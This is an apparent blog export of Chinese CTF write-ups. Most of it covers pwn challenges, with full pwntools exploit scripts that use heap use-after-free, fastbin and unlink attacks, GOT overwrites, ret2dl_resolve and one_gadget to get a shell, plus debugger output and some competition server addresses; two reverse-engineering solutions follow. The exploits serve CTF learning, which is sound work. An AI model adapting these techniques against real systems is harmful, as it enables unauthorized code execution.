rax,2syscall/*read(fp,buf,0x30)*/mov rdi,raxmov rsi,rspmov rdx,0x30xor rax,raxsyscall/*write(1,buf,0x30)*/mov rdi,1mov rax,1syscall'''pay = p64(pop_rdi) + p64(0x603060 &amp; 0xfffffffffffff000)pay += p64(pop_rsi) + p64(0x2000)pay += p64(pop_rdx) + p64(7)pay += p64(pop_rax) + p64(0xa)pay += p64(syscall_ret) + p64(jmp_rsp)pay += asm(shellcode)pause()sl(pay)log.info("free_hook --&gt; %s",hex(free_hook))# gdb.attach(p)p.interactive() easyheap首先看一下保护，没开PIE，got表可改。 12345Arch: amd64-64-littleRELRO: Partial RELROStack: Canary foundNX: NX enabledPIE: No PIE (0x400000) 漏洞点： 12345678910111213141516171819202122int add()&#123; void **v1; // rbx signed int i; // [rsp+8h] [rbp-18h] int nbytes; // [rsp+Ch] [rbp-14h] for ( i = 0; ptr[i]; ++i ) ; if ( i &gt; 2 ) return puts("Too many items!"); ptr[i] = malloc(0x10uLL); // 如果size&gt;0x400，那么就存在一个闲置的指针 puts("How long is this message?"); nbytes = sub_400890(); if ( nbytes &gt; 0x400 ) return puts("Too much size!"); *((_DWORD *)ptr[i] + 2) = nbytes; v1 = (void **)ptr[i]; *v1 = malloc(nbytes); puts("What is the content of the message?"); read(0, *(void **)ptr[i], (unsigned int)nbytes); return puts("Add successfully.");&#125; 本题唯一的漏洞点，结合没开PIE，got 表可以的情况，这是致命的 只需要构造出指向指针的堆块，接下来就是任意地址写了 123456789101112add(0x400, "0") # fakeadd(0x10, "1")delete(1)delete(0)# 此时的fatbin0x20: 0x23c8000 —▸ 0x23c8430 —▸ 0x23c8450 ◂— 0x0add(0x401)add(0x10,'1') #1# 此时的ptrpwndbg&gt; telescope 0x6020C000:0000│ 0x6020c0 —▸ 0x963010 —▸ 0x963430 ◂— 0x41001:0008│ 0x6020c8 —▸ 0x963440 —▸ 0x963460 ◂— 0x31 /* '1' */ 接下来就是先修改free@got为put@plt泄露地址，再修改free@got为system 执行system(&#39;/bin/sh&#39;) exp: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#coding:utf-8from pwn import *context.log_level = 'debug'local = 1if local: p = process('./easyheap') elf = ELF('./easyheap') libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")else: p = remote("121.36.209.145","9997") elf = ELF('./easyheap') libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")sd = lambda s:p.send(s)sl = lambda s:p.sendline(s)rc = lambda s:p.recv(s)ru = lambda s:p.recvuntil(s)sda = lambda a,s:p.sendafter(a,s)sla = lambda a,s:p.sendlineafter(a,s)def add(l,data=''): sla("choice:\n",'1') sla("message?\n",str(l)) if l &lt;= 1024: sda("message?\n",data)def delete(idx): sla("choice:\n",'2') sla("deleted?\n",str(idx))def eidt(idx,data): sla("choice:\n",'3') sla("modified?\n",str(idx)) sda("message?\n",data)add(0x400, "0") # fakeadd(0x10, "1")delete(1)delete(0)add(0x401)add(0x10,'1') #1add(0x20,'b') #2eidt(0,p64(0) + p64(0x20) + p64(elf.got['free']))eidt(1,p64(elf.plt['puts']))delete(2) #leakmain_arena = u64(rc(6).ljust(8,'\x00')) - 66libc_base = main_arena - 0x10 - libc.symbols['__malloc_hook']system = libc_base + libc.symbols['system']log.info("system --&gt; %s",hex(system))# eidt(0,p64(0) + p64(0x20) + p64(elf.got['free']))eidt(1,p64(system))add(0x20,'/bin/sh\x00')delete(2)# gdb.attach(p)p.interactive() woodenboxchecksec，got表可改，(然并卵) 12345Arch: amd64-64-littleRELRO: Partial RELROStack: Canary foundNX: NX enabledPIE: PIE enabled 该题的漏洞主要是在remove函数中，这个for 123456789for ( i = 0; i &lt;= 10; ++i )&#123; v0 = 16LL * i; v1 = (__int64 *)((char *)&amp;itemlist + 16 * (i + 1)); v2 = *v1; v3 = v1[1]; *(_QWORD *)((char *)&amp;itemlist + v0) = v2; *(_QWORD *)((char *)&amp;itemlist + v0 + 8) = v3;&#125; 当chunk列表满了的时候，再去free前面的堆块，这个神仙操作就会造成两个一样的chunk存在从而UAF 申请满12个chunk满12个后free掉0号chunk，可以看到现在10,11号chunk指向同一个，就可以自由得uaf了，光有uaf还不够，change函数中对于输入的size没有检查，所以存在堆溢出有这两点后就好办事了，先free(10)(0x70)修改其size为0x90(unsortedbin 范围),再free一次这时候fastbin上就有了main_arean+88`0x70: 0x56372f115310 —▸ 0x7ff16d603b78 (main_arena+88)修改低两们为&#39;\xdd\x25&#39;(关闭aslr情况下)，申请到_IO_2_1_stdout_上方，修改flag为0xfbad1800`来leak libc之后修改malloc_hook为onegadget exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495#coding:utf-8from pwn import *# context.log_level = 'debug'local = 1if local: p = process('./woodenbox2') elf = ELF('./woodenbox2') libc = ELF("./libc6_2.23.so")else: p = remote("121.36.215.224","9998") elf = ELF('./woodenbox2') libc = ELF("./libc6_2.23.so")#内存地址随机化def debug(addr,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) print "breakpoint_addr --&gt; " + hex(text_base + 0x2020A0) print "breakpoint_addr --&gt; " + hex(text_base + 0x202160) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) sd = lambda s:p.send(s)sl = lambda s:p.sendline(s)rc = lambda s:p.recv(s)ru = lambda s:p.recvuntil(s)sda = lambda a,s:p.sendafter(a,s)sla = lambda a,s:p.sendlineafter(a,s)def add(l,data): sla("choice:","1") sla("name:",str(l)) sda("item:",data)def edit(idx,l,data): sla("choice:","2") sla("item:",str(idx)) sla("name:",str(l)) sda("item:",data)def delete(idx): sla("choice:","3") sla("item:",str(idx))one = [0x45216,0x4526a,0xf02a4,0xf1147]def pwn(): for i in range(11): add(0x28,'a'*(i+1)) add(0x68,'b') delete(0) delete(10) add(0x58,'c'*0x10 + p64(0) + p64(0x41)) pay = 0x20*'a' + p64(0) + p64(0x91) edit(8,len(pay),pay) delete(10) edit(10,2,'\xdd\x25') pay = 0x20*'a' + p64(0) + p64(0x71) edit(7,len(pay),pay) add(0x68,'4') delete(6) pay = 0x33*'\x00' + p64(0xfbad1800) + p64(0)*3 + '\x00' add(0x68,pay) libc_base = u64(ru('\x7f')[-6:].ljust(8,'\x00')) - 0x3c5600 log.info("libc_base --&gt; %s",hex(libc_base)) malloc_hook = libc_base + libc.symbols['__malloc_hook'] fack_chunk = malloc_hook - 0x23 onegadget = libc_base + one[2] delete(8) pay = p64(fack_chunk) edit(8,len(pay),pay) delete(3) add(0x68,'e') pay = 0x13*'a' + p64(onegadget) add(0x68,pay) log.info("malloc_hook --&gt; %s",hex(malloc_hook)) sla("choice:","4") # debug(0) p.interactive()times = 0while 1: times += 1 log.warn("times --&gt; %d",times) try: pwn() except Exception: p.close() if local: p = process('./woodenbox2') else: p = remote("121.36.215.224","9998") bjutcheckseck，got表可改 12345Arch: amd64-64-littleRELRO: Partial RELROStack: Canary foundNX: NX enabledPIE: No PIE (0x400000) 漏洞点：下标溢出，在-1879的位置是指向got表的，所以通过下标溢出操作got表 exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#coding:utf-8from pwn import *context.log_level = 'debug'local = 0if local: p = process('./hw') elf = ELF('./hw') libc = ELF('./libc.so.6')else : p = remote("121.37.167.199","9997") libc = ELF('./libc.so.6')#内存地址随机化def debug(addr=0,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[2], 16) print "breakpoint_addr --&gt; " + hex(text_base + 0x40a0) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) sd = lambda s:p.send(s)sl = lambda s:p.sendline(s)rc = lambda s:p.recv(s)ru = lambda s:p.recvuntil(s)sda = lambda a,s:p.sendafter(a,s)sla = lambda a,s:p.sendlineafter(a,s)def create(l,data): sla("&gt;",'1') sla("hw:\n",str(l)) sda("hw:\n",data)def edit(idx,data): sla("&gt;",'2') sla("hw:\n",str(idx)) sda("hw:\n",data)def delete(idx): sla("&gt;",'3') sla("hw:\n",str(idx))def show(idx): sla("&gt;",'4') sla("hw:\n",str(idx))one = [0xe237f,0xe2383,0xe2386,0x106ef8]create(0x20,'a')delete(0)show(-1879)ru('\n')free_addr = u64(rc(6).ljust(8,'\x00'))libc_base = free_addr - libc.symbols['free']system = libc_base + libc.symbols['system']onegadget = libc_base + one[3]# gdb.attach(p,"b *0x401487")edit(-1846,p64(onegadget))sla("&gt;",'x')p.interactive() kernoob &amp;&amp; babyhacker两道白给的内核题，cpio文件解压后搜一下flag就知道了]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019安恒杯1月月赛]]></title>
    <url>%2F2020%2F06%2F21%2F2019%E5%AE%89%E6%81%92%E6%9D%AF1%E6%9C%88%E6%9C%88%E8%B5%9B%2F</url>
    <content type="text"><![CDATA[python_crackme（拿安恒杯1月月赛的题目she来讲）首先，你会拿到一个由python编译的exe文件，使用pyinstxtractor.py脚本（下载地址）反编译exe文件 得到一个文件夹里面有一大堆东西 用010editor打开与exe文件同名的二进制文件 添加上python3.6的.pyc文件的文件头（即前12字节）然后再加上后缀名.pyc 再在线反编译一下（反编译地址）即可得到python源码：1234567891011121314151617181920212223242526272829303132333435363738394041#!/usr/bin/env python# encoding: utf-8# 如果觉得不错，可以推荐给你的朋友！http://tool.lu/pycimport osn1 = input('Tell me your name?')n2 = input('Tell me your pasw')n11 = chr(ord(n1[0]) + 12)s = ''st3 = '51e'st2 = '9f1ff1e8b5b91110'st1 = 'c4e21c11a2412'st0 = 'wrong'if n11 + 'AnHeng' == n2: for i in range(0, 4): s += st1[3 - i] print('Congratulations') ts = st2[0] + st3 + st2[1] + s print('flag&#123;' + st3[:1] + st1 + st2 + st3[-2:] + '&#125;') os.system('pause')else: print('no,' + st0)import osn1 = input('Tell me your name?')n2 = input('Tell me your pasw')n11 = chr(ord(n1[0]) + 12)s = ''st3 = '51e'st2 = '9f1ff1e8b5b91110'st1 = 'c4e21c11a2412'st0 = 'wrong'if n11 + 'AnHeng' == n2: for i in range(0, 4): s += st1[3 - i] print('Congratulations') ts = st2[0] + st3 + st2[1] + s print('flag&#123;' + st3[:1] + st1 + st2 + st3[-2:] + '&#125;') os.system('pause')else: print('no,' + st0) old-diver32位pe文件，无壳 IDA分析：将v9的类型修改为char[]型，同时可以看到这里到401000处理的代码进行了加密异或，先解密一波：123456s = get_bytes(0x401000,0x260)buf = ''for i in s: buf += chr(ord(i)^0xbb)from idaapi import *patch_bytes(0x401000,buf) 重新构造解密部分函数，先undefine the current function（快捷键u）再 creat a function（快捷键p），重新F5，可以看到两个函数已经恢复正常 可以开始分析程序了第一步验证前5位：”flag{“然后进入sub_4010b0函数第二步异或 第三步：base64加密，”c19zbWNf”解码第四步：走迷宫 123456789-------- 上下左右g + + 2 a q w+ + ++ ++ + #+ ++ ++++ ++ ++++ ++ +--------waaaaawwwww22222qqqaaw 最终得到flag:flag{this_is_smc_waaaaawwwww22222qqqaaw}]]></content>
      <categories>
        <category>安恒杯</category>
      </categories>
      <tags>
        <tag>reverse</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019全国大学生信息安全大赛部分Wp]]></title>
    <url>%2F2020%2F06%2F21%2F2019%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%2F</url>
    <content type="text"><![CDATA[pwnyour_pwn先check 一下，发现保护全开，还是有点慌的 进入到IDA审计代码 在其主要代码里存在下标溢出，很明显地可以进行任意地址读和写（因为对于数组v4的下标v1没有进行任何的限制)，思路其实就出来了，先利用任意地址读泄漏出真实地址，再通过任意地址写将返回地址修改成onegadget 只是这里的读和写处理有点麻烦而已，因为它是单个字节读取和写入的，所以每次都要进行6次操作。 先确定v4[0]的位置gdb下断第一次输入v4[0]=100(0x64)单步跟踪找到0x64的位置 确定返回地址和要泄漏的真实地址跟v4[0]的偏移 这里其实我还算出另一个偏移：就是v1跟v4[0]的偏移，是40，为最后的退出getshell做准备，同样找到v1的位置就可以了，这里我就不截图了。 获得onegadget地址找泄漏出真实地址之后 就可以得到偏移，再查看onegadget：one_gadget+libc库 修改返回地址为onegadgetexp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121#coding:utf-8from pwn import *context.log_level = 'debug'#内存地址随机化def debug(addr,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) p = process('./pwn')# p = remote("1b190bf34e999d7f752a35fa9ee0d911.kr-lab.com","57856")elf = ELF('./pwn')libc = elf.libc# print libc# pause()p.recvuntil('name:')p.sendline('n0va')#泄漏__libc_start_main+240，每次泄漏一个字节p.recvuntil('input index\n')p.sendline('632')p.recvuntil('now value(hex) ')a = int(p.recv(2),16)print hex(a)p.recvuntil('input new value\n')p.sendline('1')p.recvuntil('input index\n')p.sendline('633')p.recvuntil('now value(hex) ')b = (int(p.recvuntil('\n')[:-1],16))&amp;0xffprint hex(b)p.recvuntil('input new value\n')p.sendline('1')p.recvuntil('input index\n')p.sendline('634')p.recvuntil('now value(hex) ')c = int(p.recvuntil('\n')[:-1],16)&amp;0xffprint hex(c)p.recvuntil('input new value\n')p.sendline('1')p.recvuntil('input index\n')p.sendline('635')p.recvuntil('now value(hex) ')d = int(p.recvuntil('\n')[:-1],16)&amp;0xffprint hex(d)p.recvuntil('input new value\n')p.sendline('1')p.recvuntil('input index\n')p.sendline('636')p.recvuntil('now value(hex) ')e = int(p.recvuntil('\n')[:-1],16)&amp;0xffprint hex(e)p.recvuntil('input new value\n')p.sendline('1')p.recvuntil('input index\n')p.sendline('637')p.recvuntil('now value(hex) ')f = int(p.recvuntil('\n')[:-1],16)&amp;0xffprint hex(f)p.recvuntil('input new value\n')p.sendline('1')print hex(a),hex(b),hex(c),hex(d),hex(e),hex(f)libc_start_main = hex(f)[2:] + hex(e)[2:] + hex(d)[2:] + hex(c)[2:] + hex(b)[2:] + hex(a)[2:]libc_main = int(libc_start_main,16)-240 #拼接得到__libc_start_main地址print hex(int(libc_start_main,16))print hex(libc_main)offset = libc_main - libc.symbols['__libc_start_main'] #偏移one_gadget = offset + 0x45216 #onegadget地址print "one_gadget--&gt; " + hex(one_gadget)#修改返回地址，每次一个字节写入a = one_gadget&amp;0xffb = one_gadget&gt;&gt;8&amp;0xffc = one_gadget&gt;&gt;16&amp;0xffd = one_gadget&gt;&gt;24&amp;0xffe = one_gadget&gt;&gt;32&amp;0xfff = one_gadget&gt;&gt;40&amp;0xffprint hex(a),hex(b),hex(c),hex(d),hex(e),hex(f)p.recvuntil('input index\n')p.sendline('344')p.recvuntil('input new value\n')p.sendline(str(a))p.recvuntil('input index\n')p.sendline('345')p.recvuntil('input new value\n')p.sendline(str(b))p.recvuntil('input index\n')p.sendline('346')p.recvuntil('input new value\n')p.sendline(str(c))p.recvuntil('input index\n')p.sendline('347')p.recvuntil('input new value\n')p.sendline(str(d))p.recvuntil('input index\n')p.sendline('348')p.recvuntil('input new value\n')p.sendline(str(e))p.recvuntil('input index\n')p.sendline('349')p.recvuntil('input new value\n')p.sendline(str(f))#修改i=40退出 循环p.recvuntil('input index\n')p.sendline('-4')p.sendline('40')p.recvuntil('do you want continue(yes/no)? \n')p.sendline('no')# flag&#123;1ed0e270f57c4e3969415180490fa07e&#125;p.interactive() baby_pwncheck，只开了NX 程度很简单，一个栈溢出漏洞，没有任何其它可用的函数，程序干净得可怕，其实就很容易想到runtime_resolve了，直接改脚本 exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#-*-coding:utf-8-*-from pwn import *context.log_level = 'debug'context.terminal = ['gnome-terminal','-x','bash','-c']context(arch='amd64', os='linux')# p = process('./pwn')p = remote("da61f2425ce71e72c1ef02104c3bfb69.kr-lab.com","33865")elf = ELF('./pwn')read_plt = elf.plt['read']alarm_got = elf.got['alarm']# write_plt = elf.plt['write']bss_addr = elf.bss()bss_stage1 = 0x800 + bss_addrbss_stage2 = 80 + bss_stage1ppp_ret = 0x080485d9pop_ebp = 0x080485dbleave_ret = 0x08048448#read(0,bss_addr,100)payload = 'a'*44payload += p32(read_plt)payload += p32(ppp_ret)payload += p32(0)payload += p32(bss_stage1)payload += p32(100)payload += p32(pop_ebp)payload += p32(bss_stage1)payload += p32(leave_ret)# p.recvuntil('Welcome to XDCTF2015~!\n')# gdb.attach(p,"b *0x08048546")# pause()p.sendline(payload)cmd = '/bin/sh'plt_0 = 0x8048380rel_plt = 0x804833cindex_offset = (bss_stage1+28) - rel_plt# write_got = elf.got['write']dynsym = 0x080481dc #objdump -s -j .dynsym bofdynstr = 0x804827c #objdump -s -j .dynstr boffake_sym_addr = bss_stage1+36align = 0x10 -((fake_sym_addr - dynsym) &amp; 0xf)fake_sym_addr = fake_sym_addr + alignindex_dynsym = (fake_sym_addr - dynsym) / 0x10r_info = (index_dynsym&lt;&lt;8) | 0x7fack_reloc = p32(alarm_got) + p32(r_info)st_name = (fake_sym_addr + 0x10) - dynstrst_name = (fake_sym_addr + 0x10) - dynstr #加0x10是因为Elf32_Sym的大小为0x10fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)payload = 'aaaa'payload += p32(plt_0)payload += p32(index_offset)payload += 'aaaa'payload += p32(bss_stage2)payload += 'aaaaaaaa'payload += fack_reloc #(bss_stage1+28)的位置payload += 'b'*alignpayload += fake_sym #(bss_stage1+36)的位置 payload += "system\x00"payload += 'a'*(80-len(payload))payload += cmd + '\x00'# payload += 'a'*(100-len(payload))p.sendline(payload)p.interactive()# flag&#123;4b91ebbdb3a0728572005c035aade579&#125; reeasyGo无符号GoLang，贴上网上一篇介绍GoLang逆向的文章，此题就是文章中的demon，flag 都没变，https://www.jishuwen.com/d/2NaJ 再附上一篇无符号Golang程序逆向方法解析https://www.anquanke.com/post/id/170332]]></content>
      <categories>
        <category>2019-iscc</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[2019上海大学生信息安全竞赛pwn题解]]></title>
    <url>%2F2020%2F06%2F21%2F2019%E4%B8%8A%E6%B5%B7%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bpwn%E9%A2%98%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[boring_heap挺不错的一题 先看一眼保护–全开 程序功能： 123451.Add2.Update3.Delete4.View5.Exit 程序漏洞主要存在update函数中 12345678910111213141516171819202122unsigned __int64 update()&#123; int v0; // ST04_4 int id; // [rsp+0h] [rbp-10h] unsigned __int64 v3; // [rsp+8h] [rbp-8h] v3 = __readfsqword(0x28u); puts("Which one do you want to update?"); id = abs(read_int()) % 30; if ( chunk_bss[id] &amp;&amp; (size_bss[id] == 0x20 || size_bss[id] == 0x30 || size_bss[id] == 0x40) ) &#123; puts("Where you want to update?"); v0 = abs(read_int()) % size_bss[id]; puts("Input Content:"); read_n((chunk_bss[id] + v0), size_bss[id] - v0); &#125; else &#123; puts("Invalid Index!"); &#125; return __readfsqword(0x28u) ^ v3;&#125; 这里abs函数取绝对值可以用0x80000000绕过(abs(0x80000000) = 0x80000000)但是后面再%size,写个c验证一下可以发现 1230x80000000 % 0x30 = 00x80000000 % 0x40 = -0x200x80000000 % 0x50 = 0 所以这里就存在了一个向上溢出0x20大小的空间，所以就可以修改到size 再来看delete函数中，UAF 123456789101112131415161718unsigned __int64 delete()&#123; int v1; // [rsp+4h] [rbp-Ch] unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); puts("Which one do you want to delete?"); v1 = abs(read_int()) % 30; if ( !chunk_bss[v1] || size_bss[v1] != 32 &amp;&amp; size_bss[v1] != 48 &amp;&amp; size_bss[v1] != 64 ) &#123; puts("Invalid Index!"); exit(1); &#125; free(chunk_bss[v1]); // UAF chunk_bss[v1] = 0LL; size_bss[v1] = 0; return __readfsqword(0x28u) ^ v2;&#125; 到这里就可以拿到libc了，但是因为add限制了size为0x30,0x40,0x50并不能申请0x60，也就是不能直接通过UAF申请到malloc_hook上方的fack_chunk来覆盖malloc_hook为onegadget； 这里换一种思路，修改top_chunk到malloc_hook： 众所周知glibc分箱式管理中，fastbin链保存在main_arena上，所以可以通过UAF留个0x51，再将main_arena申请出来修改main_arena+88为malloc_hook上方即可 exp: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788#coding:utf-8from pwn import *context.log_level = 'debug'local = 0if local: p = process('./pwn') elf = ELF('./pwn') libc = elf.libcelse: p = remote("8sdafgh.gamectf.com","10001") elf = ELF('./pwn') libc = elf.libc#内存地址随机化def debug(addr=0,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) print "breakpoint_addr --&gt; " + hex(text_base + 0x2020c0) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) sd = lambda s:p.send(s)sl = lambda s:p.sendline(s)rc = lambda s:p.recv(s)ru = lambda s:p.recvuntil(s)sda = lambda a,s:p.sendafter(a,s)sla = lambda a,s:p.sendlineafter(a,s)def add(size,message): sla("Exit\n",'1') sla("Large\n",str(size)) sda("Content:\n",message)def update(idx,where,message): sla("Exit\n",'2') sla("update?\n",str(idx)) sla("update?\n",str(where)) sla("Content:\n",message)def delete(idx): sla("Exit\n",'3') sla("delete?\n",str(idx))def show(idx): sla("Exit\n",'4') sla("view?\n",str(idx))one = [0x45216,0x4526a,0xf02a4,0xf1147]size_bss = 0x202040chunk_bss = 0x2020C0num = 0x202024add(2,'rabbit\n')#0add(2,'rabbit\n')#1add(2,'n0va\n')#2add(2,'abcd\n')#3add(3,'R4bb1t\n')#4add(3,'\n')#5# debug(0x103D)update(1,0x80000000,'a'*0x10 + p64(0) + p64(0x111))delete(1)add(2,'\n')#6show(6)main_arena = u64(rc(6).ljust(8,'\x00'))#-234libc_base = main_arena - 0x3c4c0aonegadget = libc_base + one[3]malloc_hook = libc_base + libc.symbols['__malloc_hook']fack_chunk = malloc_hook - 0x23log.warn("malloc_hook --&gt; %s",hex(malloc_hook))log.warn("main_arena --&gt; %s",hex(main_arena-234))log.warn("libc_base --&gt; %s",hex(libc_base))add(2,'\n')#7-2add(2,'\n')#8-3add(3,'\n')#9-4delete(2)delete(4)update(7,0,p64(0x51))add(2,'\n')#10update(9,0,p64(main_arena+0x10-234))add(3,'\n')#11# debug(0xca8)add(3,p64(0)*7 + p64(malloc_hook-0x23))add(3,0x13*'a' + p64(onegadget) + '\n')sla("Exit\n",'1')sla("Large\n",str(1))# debug()p.interactive() loginDelete功能中存在UAF，login功能中只要登录成功就会打印出密码 那么，我们就可以通过login功能一位一位地爆破出密码，因为没开PIE，所以可以直接爆出free@got，再UAF修改free_hook为system即可 exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172from pwn import *context.log_level = 'debug'p = process('./login')elf = ELF('./login')libc = elf.libcsd = lambda s:p.send(s)sl = lambda s:p.sendline(s)rc = lambda s:p.recv(s)ru = lambda s:p.recvuntil(s)sda = lambda a,s:p.sendafter(a,s)sla = lambda a,s:p.sendlineafter(a,s)def login(idx,l,pwd,flag = 0): if flag: sl('1') else: sla("Choice:\n",'1') sla("id:\n",str(idx)) sla("length:\n",str(l)) sda("password:\n",pwd)def register(idx,l,pwd,flag = 0): sla("Choice:\n",'2') sla("id:\n",str(idx)) sla("length:\n",str(l)) if flag: sda("password:\n",pwd) else: sla("password:\n",pwd)def delete(idx): sla("Choice:\n",'3') sla("id:\n",str(idx))def edit(idx,pwd): sla("Choice:\n",'4') sla("id:\n",str(idx)) sda("pass:\n",pwd)addr = elf.got['free']register(0,0x88,'R4bb1t')delete(0)# gdb.attach(p)register(1,0x18,p64(addr+5),1)pwd = '\x7f'# gdb.attach(p)login(0,1,pwd)for i in range(5): edit(1,p64(addr+(4-i))) for j in range(1,0x100): login(0,i+2,chr(j) + pwd,1) if "success!" in p.recvuntil('\n'): pwd = chr(j) + pwd breakprint pwdpause()free_addr = u64(pwd.ljust(8,'\x00'))libc_base = free_addr - libc.symbols['free']system = libc_base + libc.symbols['system']free_hook = libc_base + libc.symbols['__free_hook']log.warn("free_addr --&gt; %s",hex(free_addr))log.warn("libc_base --&gt; %s",hex(libc_base))edit(1,p64(free_hook))register(2,0x48,'/bin/sh\x00')edit(0,p64(system))delete(2)p.interactive() slient_note好可惜的一题，可能太久没利用got表泄漏地址，迟钝了 checksec 12345Arch: amd64-64-littleRELRO: Partial RELROStack: Canary foundNX: NX enabledPIE: No PIE (0x400000) 可以看到RELOR强度只开到Partial，也就是说got 表可改 再来看一下功能 Add12345678910111213141516171819202122232425unsigned __int64 sub_400AEC()&#123; int v1; // [rsp+4h] [rbp-Ch] unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); puts("Which kind of note do you want to add?"); sub_400AAA("Which kind of note do you want to add?"); v1 = 0; __isoc99_scanf("%d", &amp;v1); if ( v1 == 1 ) &#123; ptr = calloc(0x28uLL, 1uLL); puts("Content:"); sub_400999(ptr, 40LL); &#125; else if ( v1 == 2 ) &#123; qword_6020D8 = calloc(0x208uLL, 1uLL); puts("Content:"); sub_400999(qword_6020D8, 520LL); &#125; puts("finish!"); return __readfsqword(0x28u) ^ v2;&#125; 只能申请两种大小的堆0x28和0x208，而且用calloc，也就是申请后会清空内容，两种大小的块用两个全局变量存放，且都只能放一个 delete123456789101112131415161718192021unsigned __int64 sub_400BCF()&#123; int v1; // [rsp+4h] [rbp-Ch] unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); puts("Which kind of note do you want to delete?"); sub_400AAA("Which kind of note do you want to delete?"); v1 = 0; __isoc99_scanf("%d", &amp;v1); if ( v1 == 1 &amp;&amp; ptr ) &#123; free(ptr); &#125; else if ( v1 == 2 &amp;&amp; qword_6020D8 ) &#123; free(qword_6020D8); &#125; puts("finish!"); return __readfsqword(0x28u) ^ v2;&#125; 存在UAF 思路：unlink然后修改got表得到地址，再将free@got修改为system ,free(‘/bin/sh\x00’) get shell 具体操作就不多解释了 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869#coding:utf-8from pwn import *context.log_level = 'debug'local = 1if local: p = process('./pwn') elf = ELF('./pwn') libc = elf.libcelse: p = remote("") # elf = ELF('./')#内存地址随机化def debug(addr=0,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) print "breakpoint_addr --&gt; " + hex(text_base + 0x202040) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) sd = lambda s:p.send(s)sl = lambda s:p.sendline(s)rc = lambda s:p.recv(s)ru = lambda s:p.recvuntil(s)sda = lambda a,s:p.sendafter(a,s)sla = lambda a,s:p.sendlineafter(a,s)def add(size,message): sla("Exit\n",'1') sla("Large\n",str(size)) sda("Content:\n",message)def delete(size): sla("Exit\n",'2') sla("Large\n",str(size))def edit(size,message): sla("Exit\n",'3') sla("Large\n",str(size)) sda("Content:\n",message)chunk = 0x6020D8one = [0x45216,0x4526a,0xf02a4,0xf1147]add(2,'\n')add(1,'\n')add(1,'\n')add(1,'\n')delete(2)for i in range(0xb): add(1,'\n')pay = p64(0) + p64(0x1d0)pay += p64(chunk-0x18) + p64(chunk-0x10)pay = pay.ljust(0x1d0,'a')pay += p64(0x1d0) + p64(0x90) + '\n'edit(2,pay)delete(1)pay = p64(0)*2 + p64(elf.got['free']) + p64(elf.got['calloc']) + '\n'edit(2,pay)edit(1,p64(elf.plt['puts']) + '\n')delete(2)calloc_addr = u64(rc(6).ljust(8,'\x00'))libc_base = calloc_addr - libc.symbols['calloc']system = libc_base + libc.symbols['system']log.warn("calloc_addr --&gt; %s",hex(calloc_addr))edit(1,p64(system) + '\n')edit(2,'/bin/sh\x00' + '\n')delete(2)# debug()p.interactive()]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019红帽杯wp]]></title>
    <url>%2F2020%2F06%2F21%2F2019-%E7%BA%A2%E5%B8%BD%E6%9D%AF%2F</url>
